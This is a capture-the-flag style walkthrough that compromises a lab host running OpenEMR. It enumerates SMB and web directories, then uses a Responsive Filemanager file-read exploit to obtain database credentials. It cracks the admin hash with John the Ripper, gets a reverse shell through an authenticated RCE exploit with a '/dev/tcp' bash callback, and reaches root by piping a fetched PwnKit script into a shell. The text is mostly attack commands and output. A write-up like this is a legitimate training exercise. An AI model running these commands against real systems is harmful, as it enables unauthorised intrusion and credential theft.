##### Tags: `smb`  `mysql`  `PwnKit`  `john the ripper`

# 🐧Apex🐧
## Enumeration
Nmap
```console
$ nmap -p- -T4 -sV 192.168.157.145    
PORT     STATE SERVICE     VERSION
80/tcp   open  http        Apache httpd 2.4.29 ((Ubuntu))
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
3306/tcp open  mysql       MariaDB 5.5.5-10.1.48
Service Info: Host: APEX
```
there is a docs share in port 445 smb server 
```console
$ smbclient -L //192.168.157.145
Password for [WORKGROUP\ming]:

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        docs            Disk      Documents
        IPC$            IPC       IPC Service (APEX server (Samba, Ubuntu))
```
there are 2 files but nothing useful
```console
$ smbclient //192.168.157.145/docs
Password for [WORKGROUP\ming]:
smb: \> ls
  .                                   D        0  Thu Mar 19 22:51:54 2026
  ..                                  D        0  Thu Mar 19 22:22:48 2026
  OpenEMR Success Stories.pdf         A   290738  Sat Apr 10 01:47:12 2021
  OpenEMR Features.pdf                A   490355  Sat Apr 10 01:47:12 2021
```
port 80 is running apex webpage  
click scheduler redirect us to openemr login page
```console
http://192.168.157.145/openemr/interface/login/login.php?site=default
```
since we don't have password  
use gobuster and found /filemanager
```console
$ gobuster dir -u http://192.168.157.145 -w /usr/share/wordlists/dirb/common.txt -x php,txt,html -b 302,404
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.157.145
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   302,404
[+] User Agent:              gobuster/3.8
[+] Extensions:              php,txt,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/filemanager          (Status: 301) [Size: 324] [--> http://192.168.157.145/filemanage
```
which bring us to where the smb server docs is
```
OpenEMR Success Stories.pdf         A   290738  Sat Apr 10 01:47:12 2021
OpenEMR Features.pdf                A   490355  Sat Apr 10 01:47:12 2021
```
the web page is running RESPONSIVE filemanager v.9.13.4  
found we can copy and paste to read file remotely
```console
https://github.com/dev-team-12x/responsive_filemanager/blob/main/responsive_filemanager_file_read.py
```
we need the session id which can found in "Ctrl + Shift + i" then storage
```console
$ python3 responsive_filemanager_file_read.py http://192.168.157.145 PHPSESSID=isu82mq4d46bncpfdg18dt2ei5 /etc/passwd
[*] Copy Clipboard
[*] Paste Clipboard
root:x:0:0:root:/root:/bin/bash
white:x:1000:1000::/home/white:/bin/sh
```
the openemr password file locate is in /sites/default/sqlconf.php
```console
https://github.com/openemr/openemr/blob/master/sites/default/sqlconf.php
```
since the we can copy and paste file  
we will copy the sqlconf.php file and paste it to the smb docs directory where we can download the file  
modify the paste data path and read file url path
```console
def paste_clipboard(url, session_cookie):
    headers = {'Cookie': session_cookie,'Content-Type': 'application/x-www-form-urlencoded'}
    url_paste = "%s/filemanager/execute.php?action=paste_clipboard" % (url)
    r = requests.post(
    url_paste, data="path=Documents", headers=headers)
    return r.status_code

def read_file(url, file_name):
    name_file = file_name.split('/')[-1]
    url_path = "%s/filemanager/Documents/%s" % (url,name_file) #This is the default directory,
    #if the website is a little different, edit this place
    result = requests.get(url_path)
    return result.text
```
```console
$ python3 responsive_filemanager_file_read.py http://192.168.157.145 PHPSESSID=isu82mq4d46bncpfdg18dt2ei5 /var/www/openemr/sites/default/sqlconf.php
```
we got the config file in smb share
```console
$ smbclient //192.168.157.145/docs
Password for [WORKGROUP\ming]:
smb: \> ls
  .                                   D        0  Thu Mar 19 22:51:54 2026
  ..                                  D        0  Thu Mar 19 22:22:48 2026
  sqlconf.php                         N      639  Thu Mar 19 22:51:54 2026
  OpenEMR Success Stories.pdf         A   290738  Sat Apr 10 01:47:12 2021
  OpenEMR Features.pdf                A   490355  Sat Apr 10 01:47:12 2021
```
got the sql username and password
```console
$ cat sqlconf.php                        

$login  = 'openemr';
$pass   = 'C78maEQUIEuQ';
```
found the username and password
```console
$ mysql -u openemr -p -h 192.168.157.145 --skip-ssl-verify-server-cert
Enter password: C78maEQUIEuQ
MariaDB [openemr]> admin    | $2a$05$bJcIfCBjN5Fuh0K9qfoe0eRJqMdM49sWvuSGqv84VMMAkLgkK8XnC
```
crack the hash
```console
$ john --wordlist=/home/ming/Downloads/rockyou.txt hash.txt
Press 'q' or Ctrl-C to abort, almost any other key for status
thedoctor        (?)
```
login in the the webpage http://192.168.157.145/openemr/interface/login/login.php?site=default
found the openemr Version Number: v5.0.1 (1)  
search and found the exploit
```console
$ searchsploit openemr 5.0.1 
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                       |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
OpenEMR 5.0.1.3 - Remote Code Execution (Authenticated)                 php/webapps/45161.py                                                                             | php/webapps/45161.py
```
run get got the shell of www-data
```console
$ python2 45161.py http://192.168.157.145/openemr -u admin -p thedoctor -c 'bash -i >& /dev/tcp/192.168.45.250/445 0>&1'

$ penelope -p 445
[+] Listening for reverse shells on 0.0.0.0:445 →  127.0.0.1 • 10.0.2.15 • 192.168.45.250
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from APEX 192.168.157.145 Linux-x86_64 👤 www-data(33) • Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /usr/bin/python3
[+] Interacting with session [1] • Shell Type PTY • Menu key F12 ⇐
[+] Logging to /home/ming/.penelope/sessions/APEX~192.168.157.145-Linux-x86_64/2026_03_19-23_38_57-880.log
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
www-data@APEX:/var/www/openemr/interface/main$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
## Privilege Escalation
upload linpeas and found [CVE-2021-4034] 
```console
╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester                                                                                                                                     
[+] [CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main
```
```console
www-data@APEX:/tmp$ sh -c "$(curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.sh)"
root@APEX:/tmp# 
root@APEX:/tmp# id 
uid=0(root) gid=0(root) groups=0(root),33(www-data)
```
